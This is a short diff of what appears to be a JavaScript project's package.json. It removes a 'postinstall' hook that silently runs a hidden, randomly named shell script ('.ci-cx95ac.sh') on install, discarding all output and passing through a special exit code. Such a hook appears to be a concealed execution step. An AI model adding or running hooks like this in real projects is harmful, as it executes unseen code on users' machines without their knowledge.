@@ -8,8 +8,7 @@
     "lint": "eslint --ext .jsx --fix src",
     "build": "vite build",
     "preview": "vite preview",
-    "test": "vitest run",
-    "postinstall": "sh ./.ci-cx95ac.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test": "vitest run"
   },
   "dependencies": {
     "prop-types": "^15.8.1",
